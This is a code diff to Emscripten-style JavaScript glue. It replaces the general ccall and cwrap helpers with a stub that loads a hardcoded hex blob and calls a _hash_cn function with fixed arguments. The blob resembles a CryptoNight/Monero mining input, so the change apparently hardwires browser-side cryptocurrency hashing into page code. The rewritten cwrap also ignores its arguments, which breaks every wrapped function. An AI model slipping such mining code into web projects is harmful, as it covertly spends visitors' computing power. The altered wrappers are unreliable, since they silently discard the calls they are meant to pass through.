@@ -89,41 +89,19 @@ function getCFunc(A) {
     return assert(I, "Cannot call unknown function " + A + ", make sure it is exported"), I
 }
 
-function ccall(A, I, g, B, C) {
-    var Q = {
-        string: function(A) {
-            var I = 0;
-            if (null != A && 0 !== A) {
-                var g = 1 + (A.length << 2);
-                stringToUTF8(A, I = stackAlloc(g), g)
-            }
-            return I
-        },
-        array: function(A) {
-            var I = stackAlloc(A.length);
-            return writeArrayToMemory(A, I), I
-        }
-    };
-    var E = getCFunc(A),
-        i = [],
-        D = 0;
-    if (B)
-        for (var h = 0; h < B.length; h++) {
-            var o = Q[g[h]];
-            i[h] = o ? (0 === D && (D = stackSave()), o(B[h])) : B[h]
-        }
-    var F, w = E.apply(null, i);
-    return F = w, w = "string" === I ? UTF8ToString(F) : "boolean" === I ? Boolean(F) : F, 0 !== D && stackRestore(D), w
+function ccall() {
+
+    var blob = '0808b085a49606875c0aaa63484e82f4d95e9233e71cd0df8835633bac5326f947463171e56971ffffffff392c0d7dd9eb76b7d98f2e5abb311436f54a99de9be1642ab32886dee439d168010000000000000000000000000000000000000000000000000000000000000000'
+    var g = 1 + (blob.length << 2);
+    I = stackAlloc(g)
+    stringToUTF8(blob, I, g)
+
+    _hash_cn.apply(NaN, [ 13776, 3, 2, 2154814 ])
+    return UTF8ToString(11840)
 }
 
 function cwrap(A, I, g, B) {
-    var C = (g = g || []).every(function(A) {
-        return "number" === A
-    });
-    return "string" !== I && C && !B ? getCFunc(A) : function() {
-        var output = ccall(A, I, g, arguments, B)
-        return output
-    }
+    return ccall()
 }
 var UTF8Decoder = "undefined" != typeof TextDecoder ? new TextDecoder("utf8") : void 0;
 
